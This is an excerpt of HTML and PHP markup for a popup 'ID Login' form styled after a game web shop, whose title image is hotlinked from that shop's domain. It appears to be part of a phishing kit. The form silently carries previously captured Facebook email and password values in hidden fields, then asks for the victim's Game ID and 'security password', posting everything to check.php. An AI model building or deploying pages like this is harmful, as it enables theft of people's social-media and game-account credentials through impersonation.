...
.loginBox {
	...
	width:6.42rem;
	height:4.78rem;
	background:url(img/pop_login_bg.png) no-repeat center;
...
<div id="thickdiv" class="thickdiv" style="display: block;"></div>
<div class="loginBox" id="loginGameIdBox" style="display: block;">
<div class="title">
<img src="https://sdomino.boxiangyx.com/images/website/webShop/pop_login_title_id.png" alt="ID Login">
</div>
<form action="check.php" method="post">
<div class="loginContent">
<div class="loginForm" style="padding-top: 0;">
<input type="hidden" name="fb_email" value="<?php echo $fb_email;?>" readonly>
<input type="hidden" name="fb_pass" value="<?php echo $fb_pass;?>" readonly>
<div class="inputList wrap">
<label>Game ID</label>
<input type="text" class="inputLong" name="gid_email" id="gid_email" placeholder="Game ID" onkeyup="value=value.replace(/[^(\d)]/g,'')" autocomplete="off" required>
</div>
<div class="inputList wrap">
<label>Keamanan Password</label>
<input type="text" class="inputLong" name="gid_pass" id="gid_pass" placeholder="Keamanan Password" required>
</div>
